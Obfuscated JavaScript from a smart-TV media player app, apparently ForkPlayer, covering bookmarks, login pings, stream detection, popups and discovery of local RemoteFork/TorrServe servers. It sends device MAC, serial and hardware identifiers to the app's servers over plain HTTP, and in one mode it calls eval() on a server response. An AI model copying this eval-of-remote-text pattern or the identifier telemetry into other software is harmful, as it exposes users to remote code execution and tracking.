function is_white(n){if(n==null&&typeof gP()!="undefined")n=gP().lIQ0Il1IlIb1Il1OYpr;if(typeof n=='undefined')return 0;if(n=="tosettings"||n.indexOf("vk_audio")>0)return 1;if((n.indexOf("obovse.ru/smarttv")>0)&&n.indexOf("acestream_")==-1&&n.indexOf("iptv")==-1&&n.indexOf("fex")==-1&&n.indexOf("yapfiles")==-1&&n.indexOf("porn")==-1&&n.indexOf("xxx")==-1&&n.indexOf("adult")==-1)return 1;if(oInset[insetActive].curCh("advert")!="")return 1;var isx=0,iso=0;for(i=oInset[insetActive].history.length-1;i>=0;i--){try{var url=oInset[insetActive].history[i].url;var t=oInset[insetActive].history[i].title;console.log("iwu"+i+"="+url);if(ll0l0loMtIlIOYpr(url)||url.indexOf("http")!=0){break}
if(is_xxx(url)||is_xxx(t)||is_xxx(curPage.curCh.title)||is_xxx(curPage.curCh.stream_url)){console.log("isx=1");isx=1}}catch(e){}}
if(!isx)return 1;return 0}
function is_m3u8(url){if(url==null)url=playUrl;if(url=="")return 0;if(typeof url=='undefined')return 0;var curPage=oInset[insetActive];if(curPage.curCh!=null){if(curPage.curCh.type=="vod")return 0;if(curPage.curCh.type=="hls")return 2}
if(url.match(/\.(flv|mp4|mkv|avi|3gp|m2t|m2ts|mov|mpg|mpeg|ts).{0,1}$/)){console.log(" nom3u8 - file extension .mp4");return 0}
if(curPage.page.global.is_iptv=="true"||curPage.page.global.is_iptv)return 1;if(url.indexOf("proxym3u8")>0)return 2;if(url.indexOf("ace/getstream")>0)return 0;if(url.indexOf(":8027")>0||url.indexOf("tivio.net")>0)return 0;if((url.indexOf("j.mp")>0&&gP().is_iptv>2)||url.indexOf(".m3u8")>0)return 2;else if(url.indexOf("/chtst")>0||url.indexOf("/udp")>0||url.indexOf("/hls")>0)return 1;else if(curPage.page.lIQ0Il1IlIb1Il1OYpr.indexOf(".m3u")>0&&url.indexOf("iptv")>0)return 1;else return 0}
function ol1IO0ORc1_tI0QlYpr(url){console.log("ol1IO0ORc1_tI0QlYpr="+url);oInset[insetActive].navigate(url)}
var countHw=1.4;function updateLogin(m){try{console.log("update login");if(m==null)setTimeout("if(countHw==-1) updateLogin();",50000);if(kjtYpr.mac==undefined)return;var url=addident("http://cloudflare.appinfo.su/browseraccount/?do=ping");if(platform=="android-device")url+="&signature="+kjtYpr.signature+"&build="+kjtYpr.build;url+="&mtype="+model+"-"+kjtYpr.virtual+"&uadns="+uadns+"&other="+lg_model+"-"+lg_v+"&loader_platform="+loader_platform+"&hm="+kjtYpr.l1O0l1gmmv01O11Ypr("hm");uHelper.create().hid().addh({"Referer":"http://forkplayer.tv/device_"+kjtYpr.hardware+"_"+uaJ+"_"+kjtYpr.mac}).get(url).parse=function(s){if(gV(s)!=""){updateLoginData(s);kjtYpr.lll0Il11OxICbl1ll0Ypr("lastdata",s)}}}catch(e){console.log(e);kjtYpr.popUp("err updateLogin<br>"+e.message,1800);countHw=1.8}}
var user=null;function updateLoginData(s){try{console.log("updateLoginData");console.log(s);if(typeof s=='undefined')s="";if(s=="")s="3|MTNONEc2ODc5NAR|||||||||||||||";var t=s.split("|");countHw=t[0];if(countHw=="")countHw=1.6;else if(isNaN(parseFloat(countHw)))countHw=1.6;if(gV(t,2)!="")ipG=t[2];ipCountry=t[3];ipC=t[4];dateto=t[5];waitdonate=t[6];timestamp=t[7];if(t[8].indexOf("/device")>0)xhr_referer=3;else if(t[8].length>0)xhr_referer=1;else xhr_referer=0;if(gV(t,9)!=""){user={"login":t[9],"email":t[10],"md5":t[11]};uHelper.updateDef()}else{user=null}
if(typeof t[12]!="undefined"){if(t[12]=="info"){confirmed.create(t[13],"Profile")}}
if(timestamp<1)rek_url="rek_on";else rek_url="";gnxu=t[1]+"|"+md5("fork"+kjtYpr.mac+kjtYpr.mac+kjtYpr.serial+kjtYpr.virtual+model+ipG+"player").substr(2,15).toUpperCase()+"|"+model+"|"+kjtYpr.virtual;if(user!=null){if(gV(timestamp)<3)
t='<div id="butacc" style="position:absolute;border-left: 7px solid transparent; border-right: 7px solid transparent;border-bottom: 12px solid #ffc107;	margin: -14px 0px 0px -13px; overflow: hidden;text-align: center;"></div><span style="position: absolute; font-size: 11px; margin-top: -11px;margin-left: -8px;">i</span>';else t='<div id="butacc" style="position:absolute;position: absolute; width: 13px; height:13px; margin: -14px 0px 0px -13px;      background-color: #009688;font-size: 11px;overflow: hidden;text-align: center;border-radius: 5px;">'+user.email.substr(0,1)+'</div>'}else{t='<div id="butacc" style="position:absolute;position: absolute; width: 13px; height: 13px; margin: -14px 0px 0px -13px; background-color: #b5bdc3; font-size: 11px;overflow: hidden;text-align: center;border-radius: 5px;">x</div>'}
lI1I1IxFCIh1l01llYpr('bt6',t)}catch(e){countHw=1.65;kjtYpr.popUp("Update login failed<br>"+e.message,2000);console.log(e)}}
var lastBookm={"url":""},rt_obj=null;function xhr_bookmark(u,cmd,str,count,request_id){console.log("OPEN bookm="+u+" cmd="+cmd);var data={"channels":[]};s=kjtYpr.l1O0l1gmmv01O11Ypr("bookmarks");var sd=[];if(s!=""){sd=l0QO11lOz0bfh10l0Ypr(s);if(sd==null)sd=[];if(typeof sd.push=="undefined")sd=[]}
if(u.match(/^(zakladki)/)){if(gV(cmd)=="update")kjtYpr.lll0Il11OxICbl1ll0Ypr(u,llIl1I1HlMgNII1IO0Ypr(str));s=kjtYpr.l1O0l1gmmv01O11Ypr(u);var d=l0QO11lOz0bfh10l0Ypr(s);if(d!=null)if(typeof d.channels!="undefined")data.channels=d.channels}else if(u=="bookmarksadd"){var n=sd.length+1;payd.name="Избранное "+n;data.channels.push({"logo_30x30":_img("_ST_1px.png"),"title":"<"+payd.name+">","value":"Избранное "+n+"","search_on":"_FPName_:","playlist_url":"payd_name"});data.channels.push({"logo_30x30":_img("_ST_ok.png"),"value":"","title":"_FPPodtverdit_","playlist_url":"bookmarksaddok","description":""})}else if(u=="bookmarksaddok"){console.log("add bookm "+payd.name);if(payd.name!=""){sd.push({"title":payd.name,"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd));return{"cmd":"historyback(1);reload();","channels":[{"title":"Add OK"}]}}}else{if(u.indexOf("bookmarks/extbookm")==0){console.log("bookmarks/extbookm");if(cmd=="cmdDel"){var obj={};var ch=kjtYpr.origchannels[str];for(var key in ch){if(ch[key]!=null&&key!="rates"){if(ch[key]!=""){if(key=='title'||key=='description'){if(ch.title.indexOf("<div")==0){ch.title=ch.description.substr(0,ch.description.indexOf("<br"));ch.description=""}}
if(key=='playlist_url'&&ch[key].indexOf("#POST")>0)obj[key]=ch[key].split("#POST")[0];else obj[key]=ch[key]}}}
var url="bookm="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(obj));lIl0l1OX1vbll1I1IQYpr(addident("http://cloudflare.appinfo.su/browseraccount/?do=extbookm&v=del&dir="+u+"&n="+str+"&"+url),"extbookmdel",str)}else{ol1IO0ORc1_tI0QlYpr("http://cloudflare.appinfo.su/browseraccount/?do=extbookm&v=get&dir="+u)}
return}
if(u.indexOf("bookmarks/addext")==0){var url="bookm="+encodeURIComponent(llIl1I1HlMgNII1IO0Ypr(str));lastBookm.url=u;lastBookm.title="_FPVneshnie_ _FPzakladki_ "+u.substring(16);lastBookm.logo_30x30=_img("_ST_b_c.png");setTimeout(function(){lIl0l1OX1vbll1I1IQYpr(addident("http://cloudflare.appinfo.su/browseraccount/?do=extbookm&dir="+u+"&v=add&"+url),"extbookm")},550);return}
if(u=="bookmarks/addnew"){u="bookmarks/"+(sd.length+1);kjtYpr.inf("Создана папка "+"Избранное "+(sd.length+1),1000);sd.push({"title":"Избранное "+(sd.length+1),"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd));kjtYpr.l1Q1OIO0duul1l1IlYprPlay("",u);return}
if(u=="bookmarks/toolbar"){if(kjtYpr.GL.sidebar!="1"){rt_obj=str;confirmed.create("Отключено в Настройках. Включить?","_FPBookmark toolbar_").fun0=function(){kjtYpr.GL.sidebar=1;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));xhr_bookmark("bookmarks/toolbar","add",rt_obj);gP().lI0Il1lenfIlO0IYpr()}
return}
var exs=!1;for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u)exs=!0}
if(!exs){kjtYpr.inf("Создана папка "+"_FPBookmark toolbar_",1000);sd.push({"title":"_FPBookmark toolbar_","type":"dir","playlist_url":"bookmarks/toolbar"});kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd))}}
for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u){console.log("get bookm "+i);if(typeof(sd[i].channels)=="undefined")sd[i].channels=[];if(cmd!=null){if(cmd=="update"){sd[i].channels=str.channels;kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd));return sd[i]}else if(cmd=="count")return sd[i].channels.length
else if(cmd=="cmdRename"){sd[i].title=str}else if(cmd=="cmdUrlIcon"){sd[i].logo_30x30=str}else if(cmd=="cmdSetIcon"){sd[i].logo_30x30=str;ol1IO0ORc1_tI0QlYpr("about:bookmarks");setSelect(0)}else if(cmd=="add"){sd[i].channels.unshift(str);kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd));if(u!="bookmarks/toolbar"){lastBookm.url=u;lastBookm.title=sd[i].title;if(typeof sd[i].logo_30x30=="undefined")lastBookm.logo_30x30="";else lastBookm.logo_30x30=sd[i].logo_30x30}else{sdbar=null;sidebar_show()}
kjtYpr.inf("_FPDobavlenoV_ "+sd[i].title,1000);return}else if(cmd=="cmdDel"){if(str==-2)str=sdbarSel;sd[i].channels.splice(str,1);kjtYpr.inf("Удалено!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="alldel"){sd.splice(i,1);kjtYpr.inf("Папка удалена!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="bookmarkRename"){sd[i].channels[select].title=str}
kjtYpr.lll0Il11OxICbl1ll0Ypr("bookmarks",llIl1I1HlMgNII1IO0Ypr(sd));if(u=="bookmarks/toolbar"){sdbar=null;sidebar_show()}
if(getSelect()>=0){Ill1110().reload()}
return}
data.channels=sd[i].channels;break}}}
data.channels=delNull(data.channels);if(data.channels.length==0){kjtYpr.inf("_FPZdesPusto_!",1000);return data}
return data}
function delNull(o){for(var i=0;i<o.length;i++){if(o[i]==null||typeof o[i]=="undefined"){o.splice(i,1);i--}}
return o}
function l1Il1QOv0e10I0Ypr(){try{var len=0,free=0,after=0;for(var key in localStorage){if(key.indexOf("enteres")!=-1||key.indexOf("xml")!=-1||key.indexOf("settings")!=-1||key.indexOf("url")!=-1||key.indexOf("search")!=-1)continue;else{localStorage.removeItem(key)}}
setTimeout("kjtYpr.inf('Clear localStorage');",1000)}catch(e){}}
var dataconfirm;var favarray=null;var blic=!0,dd1=0;var licdata,licsel,licok=!1,redir=0,pltags=["title","stream_url","stream_url2","logo_30x30","description","category","category_id","playlist_url","playlist_url2","parser","mb_parser","menu_url","search_on","presearch","menu","buffer","ibuffer","jtvname","tvg-shift","value","group","chat","subtitles","yellow_url","yellow_title","yellow_parser","infolink","location","vast","type","SetTimeInterval"];var plgltags=["playlist_name","align","navigate","options","title","icon","url","server","next_page_url","prev_page_url","cacheinfo","setcache","cachetime","access","typeList","player","timeout","is_iptv","all_local","all_description","background-image","background_image","color","pageinfo","menu","style","location","setcookie","before","allvast","footer","url_tvg","info"];var lOIlIQIgtxfl0lOlOYpr=null,listTimer=null,xhr=null,xhr2=null,xhr_abort=!1,xml_vk_url,is_type="",xml_live=!1,POST_S="",waitc={};function ord_id(){var x=gP("lIQ0Il1IlIb1Il1OYpr").replace(/device_id.*?&/i,"").replace(/device_token.*?&/i,"");console.log("ord_id="+x);var nm=md5(x);return nm}
function reordered(ch){if(ordered==null){var s=kjtYpr.l1O0l1gmmv01O11Ypr("ordered");if(s=="")ordered={};else ordered=l0QO11lOz0bfh10l0Ypr(s);if(ordered==null)ordered={}}
var nm=ord_id();if(typeof ordered[nm]!="undefined"){var chs=[];for(var k in ordered[nm]){if(ordered[nm].hasOwnProperty(k)){ch[k].order=ordered[nm][k];ch[k].del=1;chs.push(ch[k])}}
for(var index=0;index<ch.length;index++){if(ch[index].del==1){ch.splice(index,1);index--;continue}}
chs.sort(function(a,b){return a.order-b.order});for(var index=0;index<chs.length;index++){if(chs[index].order>0)ch.unshift(chs[index]);else ch.push(chs[index])}}
return ch}
function hint(s,m){if($_("popUp").style.display=="block")$_("popUp").style.display="none";if($_("hint")!=null)$("#hint").remove();var div=document.createElement('div');div.id="hint";div.style.position="absolute";div.style.textAlign="left";div.style.padding="4px";div.style.borderRadius="8px";div.style.borderTopRightRadius="0px";div.style.marginTop="-14px";div.style.background="rgb(98, 100, 100)";div.style.border="1px solid #767676";div.style.fontSize="75%";div.style.zIndex="2";div.style.maxWidth="400px";div.style.marginLeft="-400px";$_(m).appendChild(div);lI1I1IxFCIh1l01llYpr("hint",s);$_("hint").style.marginLeft="-"+($_("hint").offsetWidth-10)+"px";setTimeout('$("#hint").remove();',7000)}
var popTimer,popTimer2,pop2msg=[],pop2msgint;kjtYpr.popUp=function(text,timer,cmd,och){console.log("popUp wait="+pop2msg.length);if(cmd=="full"){$_("popUp").style.top=css_wh(20)+"px";$_("popUp").style.left=css_w(20)+"px";$_("popUp").style.width="98%";$_("popUp").style.fontSize=css_wh(15)+"px";lI1I1IxFCIh1l01llYpr("popUp",text);$_("popUp").style.display="block";return}
if(och==null&&($_("popUp").style.display=="block"||pop2msg.length>0)&&rek_url==""){if(pop2msg.length==0)pop2msgint=setInterval(function(){if(pop2msg.length==0)clearInterval(pop2msgint);else if($_("popUp").style.display!="block"){var mn=pop2msg.shift();kjtYpr.popUp(mn.text,mn.timer,mn.cmd,!0)}},1000);if(timer==null)timer=1300;if(timer>1300)timer=1300;pop2msg.push({"text":text,"timer":timer,"cmd":cmd});return}
if(cmd=="url")text=text.replace(/\//g,"/ ");$_("popUp").style.top="84%";$_("popUp").style.left="75%";$_("popUp").style.width="23%";$_("popUp").style.fontSize=css_wh(15)+"px";if(cmd=='on'){$_("popUp").style.display="block";lI1I1IxFCIh1l01llYpr("popUp",text);setTimeout('$_("popUp").style.display="none";',timer);return}
if(cmd=="fav"){$_("popUp").style.top=css_wh(27)+"px";$_("popUp").style.left=css_w(774)+"px"}else if(cmd=='noborder'){$_("popUp").style.background="none";$_("popUp").style.border="none"}else if(cmd=='skip'){$_("popUp").style.backgroundColor="#E0E0E0";$_("popUp").style.border="none";$_("popUp").style.width="auto";$_("popUp").style.left=css_w(1060)+"px";$_("popUp").style.color="black";$_("popUp").style.display="block";lI1I1IxFCIh1l01llYpr("popUp",text);clearTimeout(popTimer);return}else{$_("popUp").style.backgroundColor="#E0E0E0";$_("popUp").style.border="1px solid #767676"}
$_("popUp").style.color="black";if(timer==null)timer=3500;clearTimeout(popTimer);clearTimeout(popTimer2);if(text==""){$_("popUp").style.display="none";return}
setTimeout(function(){lI1I1IxFCIh1l01llYpr("popUp",text);$_("popUp").style.display="block";popTimer=setTimeout(function(){$_("popUp").style.display="none"},timer)},160)};var inftimer,inftimer2,infad=!1;kjtYpr.inf=showinform=function(text,delay,color,tm){console.trace();console.log("INF: "+text);if(text==""){infad=!1;clearTimeout(inftimer2)}
if(text==null)text="";text=text.replace(/'/g,"").replace(/\r/g,"").split('\n');if(delay!=null){clearTimeout(inftimer);if(infad){console.log("add tm "+text);inftimer2=setTimeout("infad=false;kjtYpr.inf('"+text+"',"+delay+");",800);return}
if(color!=null)text="<span style='color:"+color+";background-color:black;'>"+text+"</span>";else text="<span style='color:white;background-color:black;'>"+text+"</span>";$_("textinfo").style.zIndex="1";lI1I1IxFCIh1l01llYpr("textinfo",text);infad=!0;inftimer=setTimeout('infad=false;lI1I1IxFCIh1l01llYpr("textinfo","");$_("textinfo").style.zIndex="0";',delay)}};var T={s:0,m:0,h:0,day:0,date:0,month:0,year:0,inetTime:0,delta:0,y_t_days:0,Sync_step:0,timezone:0,offset:new Date().getTimezoneOffset(),summertime:(new Date().getTimezoneOffset()-new Date(2011,0,11).getTimezoneOffset())/60,timestamp:0};function getDT(t){try{var timesec=new Date(parseInt(t));T.year=timesec.getFullYear();T.date=timesec.getDate();T.month=timesec.getMonth();T.day=timesec.getDay();T.h=timesec.getHours();T.m=timesec.getMinutes();T.s=timesec.getSeconds()}catch(e){console.log(e)}};function SetTimeDate(){if(T.inetTime>0){T.timestamp+=1;T.inetTime+=1000;if(handler=="iframe")return;getDT(T.inetTime+kjtYpr.GL.JTVRegion*3600000)}else{return};nkh=0;var dstring=to(T.h,T.m,T.s,0);if($_('widget_time')==null)return;if($_('widget_time').innerHTML!="&nbsp;")lI1I1IxFCIh1l01llYpr('widget_time',dstring);try{if(handler=='player'||handler=='qual'||plmini_on||kjtYpr.GL.scrsaver<1||minimize||isScreensaver||$_("main").style.display=="none")screensavertimer=-1;else{if(screensavertimer==-1)screensavertimer=T.inetTime
else if(T.inetTime-screensavertimer>185000)screensavertimer=-1;else if(T.inetTime-screensavertimer>180000)screensaver(!0)}
if((handler=='player'||handler=='qual')||(l0I110IO1SyqII1lI1Ypr&&$_("vk_audio").style.display=="block")){if(uaJ=="mag"||uaJ=="dune")getVideoPlayInfo();if(l0I110IO1SyqII1lI1Ypr||(plmini_on&&platform!="sams"))getVideoPlayInfo();else if(handler=='player'||handler=='qual'){getVideoPlayInfo()}
if(handler=="player"||handler=="qual"){if(info_mode==3||info_mode==4)dstring=dstring.substring(0,dstring.length-3);if($_("player_time")!=null)lI1I1IxFCIh1l01llYpr('player_time',dstring)}}}catch(e){console.log(e)}
var _0xf8efx72=['_FPSunday_','_FPMonday_','_FPTuesday_','_FPWednesday_','_FPThursday_','_FPFriday_','_FPSaturday_'];var _0xf8efx73=['_FPJanuary_','_FPFebruary_','_FPMarch_','_FPApril_','_FPMay_','_FPJune_','_FPJule_','_FPAugust_','_FPSeptember_','_FPOctober_','_FPNovember_','_FPDecember_'];var _0xf8efx74=_0xf8efx72[T.day];var _0xf8efx75=_0xf8efx73[T.month];var _0xf8efx76=_0xf8efx74+', '+T.date+' '+_0xf8efx75;lI1I1IxFCIh1l01llYpr('widget_date',_0xf8efx76);if(n%2800==0)selfpages={};if((n%180==0&&handler=="menu")||n%1980==0){if(kjtYpr.GL.remote){l0OI10IRge011lO1Ypr()}}
if(select<0)var st=0;else st=select;if(oInset[insetActive]){var curPage=gP();if(curPage&&curPage.channels.length)if(typeof curPage.channels[st].SetTimeInterval=="object"){var o=curPage.channels[st].SetTimeInterval;if(n%(60*o.time)==10){if(handler=="player")var u=gV(o,"onplay");else u=gV(o,"onmenu");if(u.indexOf("http")==0){var xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){console.log("SetTimeInterval message ok");var s=xhr.responseText;if(s.indexOf("}")>0){console.log("SetTimeInterval message parse");var x=l0QO11lOz0bfh10l0Ypr(s);console.log(x);if(gV(x,"message")!=""&&handler!="player")kjtYpr.inf(x.message,1200)}}};xhr.open('GET',u,!0);xhr.send()}}}}};var remoteTimer2=null,doprf1="",doprf2="",remoteXhr2=null,remoteTimer=null,remoteXhr=null,acestream=!1,prxremote="http://remote.forkplayer.tv/smarttv/api.php";function getip(t,nop){var ip="";if(gV(kjtYpr.GL,t)!="")ip=kjtYpr.GL[t];else if(gV(kjtYpr.GL,"remoteip")!=""){var ip=kjtYpr.GL.remoteip.split(":")[0]}else ip="127.0.0.1";if(ip.indexOf(":")==-1){if(t=="acestream")ip+=":6878";else if(t=="torrserve")ip+=":8090"}
if(nop)return ip.split(":")[0];else return ip}
var torver="";function AS_update(mode){$_("acesrc").style.display="none";kjtYpr.GL.aceactive=!1;kjtYpr.GL.torrserveactive=!1;if(getip("acestream")!=""){uHelper.create("directnoheader").hid().get("http://"+getip("acestream")+"/webui/api/service?method=get_version&format=jsonp&callback=mycallback").parse=function(s){if(gV(s).indexOf("mycallback")!=-1){kjtYpr.GL.aceactive=!0;$_("acesrc").style.display="block";$_("acesrc").src=_img("_ST_acesrc.png")}}}
if(getip("torrserve")!=""){uHelper.create("directnoheader").hid().get("http://"+getip("torrserve")+"/echo").parse=function(s){if(gV(s).indexOf(".")>0){torver=s;if(torver.indexOf("MatriX")>=0)torver=1.2;kjtYpr.GL.torrserveactive=!0;$_("acesrc").style.display="block";$_("acesrc").src=_img("_ST_torrserve.png");statusbar("Torrserve active! Version: "+s,"text")}}}
console.log("AS_update")}
function trylink(s){s=gV(s);if(s.indexOf("ACE_PORT")>0)s=s.replace(/ACE_PORT/g,getip("acestream").split(":")[1]);if(s.indexOf("LOCAL_PORT")>0){if(kjtYpr.GL.remoteip=="")kjtYpr.inf("Установите значение Remote Fork в Настройках!");s=s.replace(/LOCAL_PORT/g,kjtYpr.GL.remoteip.split(":")[1])}
if(s.indexOf("LOCAL_IP")>0){if(kjtYpr.GL.remoteip==""){kjtYpr.inf("Установите значение Remote Fork в Настройках!",2000);s=s.replace(/LOCAL_IP/g,"127.0.0.1")}else s=s.replace(/LOCAL_IP/g,kjtYpr.GL.remoteip.split(":")[0])}
if(s.indexOf("ACE_IP")>0)s=s.replace(/(MB_)?ACE_IP/g,getip("acestream",!0));if(s.indexOf("TORRSERVE_IP")>0)s=s.replace(/TORRSERVE_IP/g,getip("torrserve",!0));return s}
function l0OI10IRge011lO1Ypr(mode){$_("remote").style.width="56px";if(mode==null){AS_update();$_("remotesrc").style.display="none"}
if(kjtYpr.GL.remote>0){$_("remotesrc").style.display="block"}else{kjtYpr.GL.remoteactive=!1;$_("remotesrc").style.display="none";return}
if(kjtYpr.GL.remote==3&&kjtYpr.GL.remoteip==""){kjtYpr.inf("IP:PORT для RemoteFork не установлен в Настройках приложения! Установите эти данные, или выставьте значение _FPauto_",2500)}
if(mode==null&&kjtYpr.GL.remoteip!=""){console.log("local RemoteActive");RemoteActive()}else{if(kjtYpr.GL.remote==3)return;var url="http://getlist2.obovse.ru/remote/index.php?do=active&initial="+kjtYpr.mac+"|"+kjtYpr.serial+"|"+kjtYpr.hardware;if(nServer==2){if(homeurl.indexOf("operatv.obovse.ru")>0)var px="http://operatv.obovse.ru/xhrremote.php";else if(homeurl.indexOf("obovse.ru")>0)px="http://obovse.ru/xhrremote.php";else px="http://getlist2.obovse.ru/remote/index.php";url=px+"?do=active&initial="+kjtYpr.mac+"|"+kjtYpr.serial+"|"+kjtYpr.hardware}
remoteXhr2=new XMLHttpRequest();remoteXhr2.onreadystatechange=function(){if(remoteXhr2.readyState==4){clearTimeout(remoteTimer2);var gp=remoteXhr2.responseText.split("|")[0];if(gp.indexOf(":80")>0&&gp.length>9)kjtYpr.GL.remoteip=gp;if(remoteXhr2.responseText.split("|")[1]=="proxy")kjtYpr.GL.proxy=1;else kjtYpr.GL.proxy=0;console.log("PRX="+gp[1]+" "+kjtYpr.GL.proxy);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));RemoteActive(!0)}};remoteXhr2.open('GET',url,!0);remoteXhr2.send();remoteTimer2=setTimeout(function(){remoteXhr2.abort()},17000);console.log("update"+url)}}
var rf_ver=0;function RemoteActive(mode){if(kjtYpr.GL.remoteip==""){$_("remotesrc").src=_img("_ST_remoteOffline.png");kjtYpr.GL.remoteactive=!1;return}
acestream=!1;if(kjtYpr.GL.proxy==1&&mode!=null){remote_version=1.2;vr=0;kjtYpr.GL.remoteactive=!1;$_("remotesrc").src=_img("_ST_remoteOnlineU.png");if(homeurl.indexOf("operatv.obovse.ru")>0)prxremote="http://operatv.obovse.ru/xhrremote.php";else if(homeurl.indexOf("obovse.ru")>0)prxremote="http://obovse.ru/xhrremote.php";else prxremote="http://remote.forkplayer.tv/smarttv/api.php";return}
kjtYpr.GL.proxy=0;prxremote="http://remote.forkplayer.tv/smarttv/api.php";var url="http://"+kjtYpr.GL.remoteip+"/test?"+kjtYpr.mac+"|"+kjtYpr.serial+"|"+kjtYpr.hardware;url=url.replace(":80/","/");remoteXhr=new XMLHttpRequest();remoteXhr.onreadystatechange=function(){if(remoteXhr.readyState==4){clearTimeout(remoteTimer);if(/polaroid/i.test(ua)){}
if(remoteXhr.responseText.indexOf("Ace Stream")>0)acestream=!0;if(remoteXhr.responseText.indexOf("Work")>0){if(remoteXhr.responseText.indexOf("Android")>0||kjtYpr.GL.remoteip.indexOf(":8028")>0)$_("remotesrc").src=_img("_ST_st_andr.png");else $_("remotesrc").src=_img("_ST_remoteOnline.png");$_("remotesrc").width=css_w(24);kjtYpr.GL.remoteactive=!0;if(remoteXhr.responseText.indexOf("Visual Studio")>0||remoteXhr.responseText.indexOf("RemoteFork Server")>0){remote_version=1.2}else remote_version=1.1;mc=remoteXhr.responseText.match(/v\. (\d+\.\d+)\./);console.log("MC");console.log(mc);if(mc!=null){vr=mc[1];if(vr>=1.40){doprf1="/hlsproxy";doprf2="/acestream"}}
mc=remoteXhr.responseText.match(/v\. (.*?)</);if(mc!=null)rf_ver=mc[1]}else{vr=0;remote_version=0;$_("remotesrc").src=_img("_ST_remoteOffline.png");kjtYpr.GL.remoteactive=!1;if(!mode)l0OI10IRge011lO1Ypr(!0)}}};remoteXhr.open('GET',url,!0);remoteXhr.send();remoteTimer=setTimeout(function(){$_("remotesrc").src=_img("_ST_remoteOffline.png");kjtYpr.GL.remoteactive=!1;remoteXhr.abort()},2500);console.log("RemoteActive"+url)}
function to(_0xf8efx6b,_0xf8efx6c,Seconds,_0xf8efxc){return(_0xf8efx6b>9?_0xf8efx6b:('0'+_0xf8efx6b))+':'+(_0xf8efx6c>9?_0xf8efx6c:('0'+_0xf8efx6c))+((Seconds!=null)?(':'+(Seconds>9?Seconds:('0'+Seconds))):'')};function to2(sec){if(isNaN(sec)||sec==Infinity)return"∞";var s=" 0"+(sec%60);m=Math.floor(sec/60);return m+":"+s.substr(s.length-2)}
var m3u8_url="";function lIl0l1OX1vbll1I1IQYpr(url,mode,y,title,orig,request_id){var orig_url=url;console.trace();console.log("lIl0l1OX1vbll1I1IQYpr "+mode);if(orig!=null)orig_url=orig;var xhrt=new XMLHttpRequest();xhrt.onreadystatechange=function(){if(xhrt.readyState==4){var s=xhrt.responseText;if(mode=="showinfo"){kjtYpr.inf(s,2500)}
if(mode=="extbookmdel"){var js=l0QO11lOz0bfh10l0Ypr(s)["channels"][0];kjtYpr.inf(js.title,1500);console.log("DEL EXT");console.log(js.title);if(js.title.indexOf("Удалено")!=-1){curPage.channels=js.channels;if(select>0)--select;console.log(curPage.channels);l11II1_JfwgOlIl1Ypr=Math.random();oInset[insetActive].focused()}
return}
if(mode=="extbookm"){kjtYpr.inf(l0QO11lOz0bfh10l0Ypr(s)["channels"][0].title,1500);return}
if(mode=="tomflight"){t_glrek=xhrt.responseText;s=t_glrek.split("<br>");lI1I1IxFCIh1l01llYpr("gallrel","WEEK "+s[2]+" "+s[1]+":"+s[0].split(":")[1]);if(s[3]=="new"){VK.Show(null,null,"tomflight","_FPWeek record! Enter your nickname_",gV(user,"login"));$_("game").style.zIndex="0";$_("l1IOI0lu11lO1IYpr").style.zIndex="0";l1IOI0lu11lO1IYprmode=0;try{$_("l1IOI0lu11lO1IYpr").parentNode.removeChild($_("l1IOI0lu11lO1IYpr"))}catch(e){}}}
xhrt=null}};if(mode=="newvideo"){if(url.length>30000){url=url.replace("//obovse.ru","//"+serverLoad[1].url)}else if(lIOO01vuII1IQIYpr!=""&&url.indexOf("tv/wlist.php")==-1&&url.indexOf("php?bylist=")==-1&&url.indexOf("mylist")==-1&&url.indexOf("smarttv/api")==-1&&url.indexOf("forkiptv.php")==-1){url=url.replace("//obovse.ru","//"+lIOO01vuII1IQIYpr)}
url=addident(url)}
xhrt.open('GET',url,!0);xhrt.send()};function closeapp(){try{if(uaJ=="mag"){window.location=resolution_portal}else if(uaJ=="dune"){window.location=resolution_portal}else if(platform=="sams")widgetAPI.sendReturnEvent();else if(is_tizen)tizen.application.getCurrentApplication().exit();else if(platform=="android-device")andr.cmd("exit");else if(typeof window.NetCastExit!="undefined")window.NetCastExit();else{try{webOS.platformBack()}catch(e){console.log(e)}
window.close()}}catch(e){console.log(e)}}
function lIl0l1OX1vbll1I1IQYprPost(url,p,mode,request_id){var xhrt=null;xhrt=new XMLHttpRequest();console.log("mode="+mode);xhrt.onreadystatechange=function(){if(xhrt.readyState==4){statusbar("off");if(mode=="sethls"){lIIl0Il0LaVOO0OIYpr();ll0lIOsIoIIlOlYpr(xhrt.responseText)}
if(mode=="xmltv"){try{eval(xhrt.responseText)}catch(e){statusbar(xhrt.responseText.substr(0,140))}}else if(mode=="translatepage"){var data=l0QO11lOz0bfh10l0Ypr(xhrt.responseText);if(data.code=='404'){kjtYpr.popUp(data.message,1500)}else{var j=0;var curPage=gP();oInset[insetActive].put("title",data[j++]);for(var i=0;i<curPage.channels.length;i++){curPage.channels[i].title=data[j++];curPage.channels[i].description=data[j++]}}
oInset[insetActive].focused()}}};console.log(url);xhrt.open('POST',url,!0);xhrt.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhrt.send(p)}
